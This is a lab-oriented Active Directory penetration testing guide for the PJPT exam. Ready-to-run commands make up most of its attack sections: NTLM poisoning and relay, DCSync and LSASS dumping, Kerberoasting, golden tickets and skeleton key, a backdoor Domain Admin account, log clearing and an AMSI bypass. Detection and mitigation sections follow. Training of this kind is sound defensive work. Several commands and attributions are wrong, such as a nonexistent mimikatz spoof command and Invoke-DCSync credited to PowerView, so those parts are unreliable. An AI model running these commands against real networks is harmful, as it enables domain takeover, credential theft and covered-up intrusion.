# Windows Server 2025 Active Directory Penetration Testing Guide

_Note: Windows Server 2025 (Preview/Insider build at time of writing) - techniques apply to current Windows Server environments with minor adaptations._

This guide documents common Active Directory attack techniques in a **lab-only, authorized testing environment**, aligned with **PJPT methodology**. This guide mirrors PJPT exam expectations: manual enumeration, misconfiguration abuse, documentation, and defensive remediation. Placeholder IPs such as `ip_dc`, `ip_client`, and `ip_victim` should be replaced with real values in your lab.

---

## Table of Contents

1. [Phase 1: Initial Enumeration & Attacks](#phase-1-initial-enumeration--attacks)
2. [Phase 2: Post-Exploitation & Privilege Escalation](#phase-2-post-exploitation--privilege-escalation)
3. [Phase 3: Advanced Active Directory Attacks](#phase-3-advanced-active-directory-attacks)
4. [Phase 4: Delegation & Credential Abuse](#phase-4-delegation--credential-abuse)
5. [Phase 5: Domain Persistence Techniques](#phase-5-domain-persistence-techniques)
6. [Phase 6: Lateral Movement Techniques](#phase-6-lateral-movement-techniques)
7. [Phase 7: Defense Evasion](#phase-7-defense-evasion)
8. [Phase 8: Cleanup & Reporting](#phase-8-cleanup--reporting)
9. [Tool Matrix](#tool-matrix-pjpt-oriented)
10. [PJPT Checklist](#pjt-checklist)
11. [Defensive Mitigations](#defensive-mitigations)
12. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
13. [Blue Team Detection & Logging](#blue-team-detection--logging)
14. [Hands-On Lab Walkthrough](#hands-on-lab-walkthrough)

---

## Phase 1: Initial Enumeration & Attacks

### 1. LLMNR/NBT-NS Poisoning (Capturing NTLM Hashes)

**Attacker Objective**: Exploit weak name resolution protocols to capture NTLMv2 hashes.

**Tools**: Responder

```bash
sudo responder -I eth0 -dwPv
```

**Expected Output**:

```
USERNAME::DOMAIN:HASH_PART:NT_HASH...
```

**Cracking the Hash**:

```bash
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Alternative Tool: Inveigh**

```powershell
# PowerShell alternative for Windows-based testing
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -FileOutput Y
```

**Defender Note**: LLMNR and NBT-NS should be disabled via Group Policy in production environments.

---

### 2. SMB Relay Attack (NTLM Relay)

**Attacker Objective**: Relay captured hashes to gain unauthorized access.

_Note: Success depends heavily on SMB signing, LDAP signing, EPA, and channel binding configuration. SMB relay requires SMB signing disabled on target hosts._

**Identify Vulnerable Hosts**:

```bash
sudo nmap --script=smb2-security-mode.nse -p445 ip_client1,ip_client2 -Pn
```

Look for `Message signing: disabled`.

**Prepare Targets File**:

```bash
echo "ip_client1" > targets.txt
echo "ip_client2" >> targets.txt
```

**Launch Relay**:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

**Interactive Shell**:

```bash
nc 127.0.0.1 11000
```

**Alternative Approach: MultiRelay**

```bash
# MultiRelay provides additional SMB relay functionality
python3 MultiRelay.py -t ip_victim -u ALL
```

**Defender Note**: Enforce SMB signing on all clients and servers via Group Policy.

---

### 3. IPv6 DNS Takeover (mitm6 + NTLM Relay)

**Attacker Objective**: Abuse IPv6 auto-configuration to intercept authentication.

```bash
mitm6 -d domain.local -i eth0
```

```bash
impacket-ntlmrelayx -6 -t ldaps://ip_dc -wh fakewpad.domain.local -l lootme
```

**Enhanced Detection with IPv6 Scanner**:

```bash
# Identify IPv6-enabled hosts before attack
sudo nmap -6 --script=targets-ipv6-multicast-echo -p icmpv6 domain.local/64
```

**Defender Note**: Configure IPv6 DNS settings explicitly or disable IPv6 if not required.

---

## Phase 2: Post-Exploitation & Privilege Escalation

### 1. Dumping AD Credentials (DCSync / Secretsdump)

_Note: DCSync requires DS-Replication-Get-Changes rights (e.g., Domain Admins, Enterprise Admins, or explicitly delegated accounts)._

```bash
impacket-secretsdump domain/user:password@ip_dc
```

**Alternative: PowerView DCSync**

```powershell
Import-Module .\PowerView.ps1
Invoke-DCSync -PWDumpFormat -Users @("Administrator", "krbtgt")
```

**Using Mimikatz for Local Credential Extraction**:

```bash
# Dump LSASS memory for credential extraction
# Requires local admin rights; Credential Guard may block this
mimikatz # sekurlsa::logonpasswords
```

**Defender Note**: Monitor for Event ID 4662 with DS-Replication-Get-Changes rights.

---

### 2. Kerberoasting

```bash
impacket-GetUserSPNs domain.local/user:password -dc-ip ip_dc -request -outputfile kerberoast_hashes.txt
```

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Alternative: Rubeus Kerberoast**

```powershell
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /user:svc_sql /format:hashcat /outfile:hashes.txt
```

**Automated Enumeration with Kerbrute**:

```bash
# Enumerate valid domain users for targeted kerberoasting
kerbrute userenum -d domain.local --dc ip_dc users.txt
```

**Defender Note**: Monitor Event ID 4769 with encryption type 0x17 (RC4).

---

### 3. Pass-the-Hash

```bash
crackmapexec smb ip_client1 -u administrator -H NTLM_HASH --local-auth
```

**Alternative: Evil-WinRM with Pass-the-Hash**

```bash
evil-winrm -i ip_victim -u Administrator -H NTLM_HASH
```

**Using Mimikatz for Pass-the-Ticket**:

```bash
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH
```

**Defender Note**: Enable Protected Users group and require AES Kerberos encryption.

---

### 4. Token Impersonation

```text
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token DOMAIN\\Administrator
```

**Alternative: RottenPotato Token Manipulation**

```bash
# Privilege escalation via token impersonation
.\RottenPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami"
```

**Defender Note**: Monitor for Event ID 4672 (privilege use) and token manipulation.

---

### 5. Persistence (Backdoor User)

```bash
net user /add backdooruser P@ssw0rd123! /domain
net group "Domain Admins" backdooruser /ADD /DOMAIN
```

**Alternative: Golden Ticket Persistence**

```bash
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /ptt
```

_Note: Golden and Silver Ticket attacks are rare in modern environments with krbtgt rotation, AES enforcement, and monitoring, but remain valuable for lab demonstration._

**Scheduled Task Persistence**:

```powershell
# Create scheduled task for persistence
schtasks /create /tn "AD Backup" /tr "C:\backdoor.exe" /sc daily /ru "SYSTEM"
```

**Defender Note**: Monitor Event ID 4720 (user created) and 4732 (group membership changes).

---

## Phase 3: Advanced Active Directory Attacks

### 1. AS-REP Roasting

```bash
impacket-GetNPUsers domain.local/ -dc-ip ip_dc -usersfile users.txt -outputfile asrep_hashes.txt
```

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Using Rubeus for AS-REP Roasting**:

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

**Defender Note**: Monitor for accounts with "Do not require Kerberos preauthentication" and Event ID 4768.

---

### 2. LDAP Enumeration

```bash
crackmapexec ldap ip_dc -u user -p password --users
crackmapexec ldap ip_dc -u user -p password --groups
```

**Advanced LDAP Query with AdFind**:

```bash
# Enumerate domain trusts
AdFind.exe -b dc=domain,dc=local -f "(objectclass=trustedDomain)" -t 300 -h ip_dc -u user -up password

# Find users with SPNs
AdFind.exe -b dc=domain,dc=local -f "(&(objectcategory=person)(objectclass=user)(servicePrincipalName=*))" servicePrincipalName
```

**LDAP Signing and Channel Binding Check**:

```bash
# Check LDAP security settings
nmap -p 389 --script ldap-rootdse ip_dc
ldapsearch -H ldap://ip_dc -x -s base -b "" "(objectClass=*)" supportedSASLMechanisms
```

**Defender Note**: Enable LDAP signing and channel binding.

---

### 3. BloodHound Collection

```bash
bloodhound-python -u user -p password -d domain.local -dc ip_dc -c All
```

**Alternative: SharpHound Collector**

```powershell
# Deploy SharpHound on compromised host
.\SharpHound.exe --CollectionMethod All --Domain domain.local --LdapUsername user --LdapPassword password
```

**Targeted BloodHound Collection**:

```bash
# Collect specific data to reduce noise
bloodhound-python -u user -p password -d domain.local -dc ip_dc -c GroupMembership,LocalAdmin,Sessions
```

**Defender Note**: Monitor for unusual LDAP query patterns and data extraction.

---

## Phase 4: Delegation & Credential Abuse

### 1. DCSync Attack

```bash
impacket-secretsdump domain.local/user@ip_dc -just-dc
```

**DCSync with Specific User Targeting**:

```bash
impacket-secretsdump domain.local/Administrator@ip_dc -just-dc-user krbtgt
```

**Detection Evasion with Custom Timing**:

```bash
# Slow DCSync to avoid detection thresholds
impacket-secretsdump domain.local/user@ip_dc -just-dc -debug -timeout 30
```

**Defender Note**: Monitor for Event ID 4662 with replication rights.

---

### 2. Constrained Delegation Abuse

```bash
impacket-getST domain.local/service_account -spn cifs/ip_dc -impersonate Administrator
```

**Unconstrained Delegation Monitoring**:

```bash
# Find computers with unconstrained delegation
crackmapexec ldap ip_dc -u user -p password -M find-delegation
```

**Resource-Based Constrained Delegation Abuse**:

```powershell
# Check for RBCD opportunities
.\Powermad.ps1
Set-ADComputer -Identity TargetComputer$ -PrincipalsAllowedToDelegateToAccount AttackerComputer$
```

**Defender Note**: Monitor for unusual service ticket requests (Event ID 4769).

---

## Phase 5: Domain Persistence Techniques

### 1. Golden Ticket

```text
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXX /krbtgt:HASH /ptt
```

**Silver Ticket Attack**:

```bash
# Create silver ticket for specific service
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXXX /target:DC.domain.local /service:HOST /rc4:SERVICE_HASH /ptt
```

**Skeleton Key Persistence**:

```bash
# Install skeleton key backdoor
mimikatz # misc::skeleton
```

_Note: Golden and Silver Ticket attacks are less effective in modern environments with krbtgt rotation (every 30 days) and AES enforcement._

**Defender Note**: Monitor for Kerberos tickets with abnormal lifetimes and encryption types.

---

### 2. ACL Backdooring

```powershell
# Add GenericAll rights to user
Add-ObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity backdooruser -Rights All
```

**Using BloodHound to Identify ACL Attack Paths**:

```cypher
MATCH p=(u:User)-[r:Owns|GenericAll|WriteDacl|WriteOwner|GenericWrite]->(g:Group) RETURN p
```

**Defender Note**: Regularly audit ACLs on sensitive objects.

---

### 3. Domain Trust Attacks

```bash
# Enumerate domain trusts
nltest /domain_trusts /all_trusts /v
```

**Inter-Realm Trust Exploitation**:

```bash
# Request TGT from trusted domain
impacket-getTGT domain.local/user:password
```

**Defender Note**: Monitor for cross-domain authentication and SID filtering.

---

## Phase 6: Lateral Movement Techniques

### 1. WMI Execution

```bash
impacket-wmiexec domain/user:password@ip_victim "whoami"
```

**Alternative: WinRM for Lateral Movement**

```bash
evil-winrm -i ip_victim -u Administrator -p Password123
```

**Defender Note**: Monitor for Event ID 4688 with remote process creation.

---

### 2. Scheduled Task Deployment

```bash
# Create remote scheduled task
schtasks /create /s ip_victim /u domain\user /p password /tn "Update" /tr "cmd.exe /c whoami" /sc once /st 00:00
schtasks /run /s ip_victim /tn "Update"
```

**Defender Note**: Monitor for Event ID 4698 (scheduled task creation).

---

### 3. DCOM Lateral Movement

```powershell
# Execute via MMC20.Application COM object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","ip_victim"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
```

**Defender Note**: Monitor for DCOM activation and remote code execution.

---

## Phase 7: Defense Evasion

### 1. Log Clearing

```powershell
# Clear specific event logs
wevtutil cl Security
wevtutil cl System
```

_Note: Selective log tampering is difficult; most modern systems require full log clearing or offline manipulation. Log clearing is highly detectable._

**Selective Log Management**:

```powershell
# Export specific logs for analysis (defensive use)
wevtutil epl Security C:\Audit\security_backup.evtx
```

**Defender Note**: Monitor for Event ID 1102 (log cleared) and implement WEF/SIEM.

---

### 2. Parent Process Spoofing

```bash
# Spoof legitimate parent process
mimikatz # process::spoof /parent:explorer.exe /child:backdoor.exe
```

**Defender Note**: Monitor for abnormal parent-child process relationships.

---

### 3. AMSI Bypass

```powershell
# Bypass AMSI for PowerShell execution
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

_Note: This technique is noisy and primarily useful for learning; modern EDRs often detect it instantly. Real engagements require more sophisticated bypasses._

**Defender Note**: Monitor for AMSI bypass attempts and suspicious PowerShell execution.

---

## Phase 8: Cleanup & Reporting

### Cleanup Procedures

- Remove created users and groups
- Delete scheduled tasks and services
- Remove registry persistence entries
- Clear command history and logs

```bash
net user backdooruser /delete /domain
schtasks /delete /tn "AD Backup" /f
```

**Advanced Cleanup with Autoruns**:

```powershell
# Use Sysinternals Autoruns to identify and remove persistence
.\Autoruns64.exe -accepteula -a * -c -s -h
```

**Defender Note**: Maintain baseline configurations and monitor for unauthorized changes.

---

## Tool Matrix (PJPT-Oriented)

| Phase              | Purpose                       | Primary Tools                 | Secondary Tools                |
| ------------------ | ----------------------------- | ----------------------------- | ------------------------------ |
| Recon              | Network and service discovery | nmap, crackmapexec            | pingcast, netexec              |
| Poisoning          | Capture credentials           | Responder, mitm6              | Inveigh, bettercap             |
| Relay              | Authentication abuse          | impacket-ntlmrelayx           | MultiRelay, mitm_relay         |
| Enumeration        | AD object discovery           | ldapsearch, BloodHound        | AdFind, PowerView, enum4linux  |
| Credential Attacks | Hash extraction               | secretsdump, mimikatz         | LaZagne, pypykatz              |
| Lateral Movement   | Host-to-host access           | CME, PsExec, WMI              | PAExec, WinRM, DCOM            |
| Persistence        | Long-term access              | mimikatz, native tools        | SharPersist, PowerSploit       |
| Defense Evasion    | Avoid detection               | AMSI bypass, log manipulation | Phantom DLL, process hollowing |

---

## PJPT Checklist

- Scope and authorization confirmed
- LLMNR/NBT-NS tested and documented
- SMB signing validation across all hosts
- NTLM relay attempts with varying protocols
- Kerberoasting executed with user enumeration
- AS-REP roasting against identified accounts
- BloodHound analysis completed and paths reviewed
- ACL enumeration and potential backdoor locations
- Delegation configurations analyzed
- Domain trust relationships examined
- Multiple privilege escalation vectors tested
- Domain compromise demonstrated
- Persistence mechanisms established and removed
- Cleanup performed and verified
- Comprehensive report with reproduction steps
- Defensive recommendations provided

---

## Defensive Mitigations

### Network Level Protections

- Disable LLMNR and NBT-NS via Group Policy
- Enforce SMB signing on all endpoints
- Enable LDAP signing and channel binding
- Implement strict firewall rules for AD ports
- Monitor IPv6 adoption and configuration

### Authentication Security

- Implement LAPS (Local Administrator Password Solution)
- Deploy Credential Guard for Windows 10/11
- Require Kerberos AES encryption
- Enable Protected Users security group
- Implement multi-factor authentication

### Monitoring and Detection

- Configure Windows Event Forwarding (WEF)
- Implement Sysmon with appropriate configuration
- Deploy SIEM for centralized logging
- Establish baseline authentication patterns
- Create alerts for suspicious Kerberos activity

### Administrative Controls

- Implement Just Enough Administration (JEA)
- Enforce principle of least privilege
- Regular service account password rotation
- Monitor for ACL modifications
- Implement time-based access controls

---

## MITRE ATT&CK Mapping

| Technique              | ID        | Primary Tools           | Detection Methods                        |
| ---------------------- | --------- | ----------------------- | ---------------------------------------- |
| LLMNR/NBT-NS Poisoning | T1557.001 | Responder, Inveigh      | Network monitoring for LLMNR/NBNS        |
| SMB Relay              | T1557.002 | impacket-ntlmrelayx     | SMB signing logs, 4624 events            |
| Kerberoasting          | T1558.003 | GetUserSPNs, Rubeus     | 4769 events with encryption type 0x17    |
| AS-REP Roasting        | T1558.004 | GetNPUsers              | Pre-authentication disabled monitoring   |
| Pass-the-Hash          | T1550.002 | crackmapexec, mimikatz  | 4624 events with logon type 9            |
| Token Impersonation    | T1134.001 | incognito, RottenPotato | 4672 events for token elevation          |
| DCSync                 | T1003.006 | secretsdump, mimikatz   | 4662 events with DS-Replication rights   |
| Golden Ticket          | T1558.001 | mimikatz                | Kerberos ticket lifetime monitoring      |
| Lateral Movement       | T1021     | PsExec, WMI, WinRM      | 4688 events with remote process creation |
| Persistence            | T1136     | net user, schtasks      | 4720, 4732, 4698 events                  |

---

## Blue Team Detection & Logging

### Advanced Event Monitoring

**Authentication Anomalies**:

```
Event ID 4624: Account Logon
- Monitor for unusual logon types (Type 3, 8, 9)
- Track logon outside business hours
- Alert on multiple failed logons followed by success
```

**Kerberos Attack Detection**:

```
Event ID 4768: TGT Request
- Monitor for requests without pre-authentication
- Alert on AES disabled in encryption type
- Track ticket request volume per account

Event ID 4769: Service Ticket Request
- Monitor for unusual SPN requests
- Alert on RC4-HMAC encryption type
- Track ticket request frequency
```

**Directory Service Access**:

```
Event ID 4662: Operation performed
- Monitor for DS-Replication-Get-Changes-All
- Alert on sensitive attribute modifications
- Track access to krbtgt account properties
```

### Network-Based Detection

**SMB Relay Detection**:

- Monitor for SMB sessions without signing
- Alert on SMB connections followed by authentication to different hosts
- Detect NTLM authentication over non-standard ports

**LLMNR/NBT-NS Poisoning**:

- Baseline normal LLMNR/NBNS traffic
- Alert on excessive LLMNR responses
- Monitor for LLMNR queries for WPAD

### Behavioral Analytics

**User Behavior Analytics (UBA)**:

- Establish baseline user activity patterns
- Detect unusual access times or locations
- Alert on privilege escalation patterns
- Monitor for access to sensitive data stores

**Endpoint Detection and Response (EDR)**:

- Monitor process creation with network activity
- Detect credential dumping from LSASS
- Alert on suspicious PowerShell execution
- Track DLL loading patterns

---

## Hands-On Lab Walkthrough

### Lab Setup

- One Windows Server 2025 Domain Controller
- Two Windows 10/11 domain-joined clients
- One Windows Server member server
- One Kali Linux attacker machine
- Active Directory domain: domain.local
- Forest trust to child domain: child.domain.local

### Lab Objectives

- Capture and relay NTLM credentials
- Enumerate AD structure and identify misconfigurations
- Escalate privileges using multiple techniques
- Perform lateral movement across the domain
- Establish persistence mechanisms
- Demonstrate detection evasion techniques
- Perform comprehensive cleanup
- Generate detailed defensive recommendations

### Step 1: Comprehensive Network Enumeration

- Perform subnet discovery using multiple tools
- Identify all domain controllers and servers
- Map network services and open ports
- Document domain structure and trust relationships

### Step 2: Credential Capture and Abuse

- Perform LLMNR/NBT-NS poisoning with multiple tools
- Capture and crack NTLM hashes
- Identify SMB signing misconfigurations
- Execute SMB relay attacks
- Perform IPv6 DNS takeover

### Step 3: Active Directory Enumeration

- Enumerate users, groups, computers, and OUs
- Identify service accounts with SPNs
- Check for constrained and unconstrained delegation
- Identify misconfigured ACLs
- Collect BloodHound data and analyze attack paths

### Step 4: Privilege Escalation Techniques

- Perform Kerberoasting against service accounts
- Execute AS-REP roasting against vulnerable users
- Exploit misconfigured user rights assignments
- Abuse ACL permissions for privilege escalation
- Perform DCSync to extract credential hashes

### Step 5: Lateral Movement

- Use Pass-the-Hash for authentication
- Perform WMI and WinRM lateral movement
- Create and execute scheduled tasks remotely
- Abuse DCOM for code execution
- Move between domain trusts

### Step 6: Domain Persistence

- Create golden and silver tickets
- Establish skeleton key persistence
- Create backdoor user accounts
- Set up scheduled tasks for persistence
- Modify ACLs for future access

### Step 7: Defense Evasion

- Clear specific event logs
- Implement AMSI bypass techniques
- Use process spoofing and injection
- Modify firewall rules to maintain access

### Step 8: Comprehensive Cleanup

- Remove all created user accounts and groups
- Delete scheduled tasks and services
- Remove registry persistence entries
- Restore modified ACLs
- Clear command history and logs
- Verify all changes have been reverted

### Step 9: Advanced Reporting

- Document complete attack chain with evidence
- Map all techniques to MITRE ATT&CK framework
- Provide detailed defensive recommendations
- Include detection rules and monitoring strategies
- Develop remediation plan for identified vulnerabilities

---

## Conclusion

This comprehensive guide provides a PJPT-aligned Active Directory penetration testing workflow suitable for authorized lab environments. The guide balances attack techniques with defensive considerations, emphasizing proper authorization, documentation, and cleanup. All techniques should be tested only in environments where explicit permission has been granted. Regular updates to methodologies are required as both attack techniques and defensive controls continue to evolve in Windows Server environments.
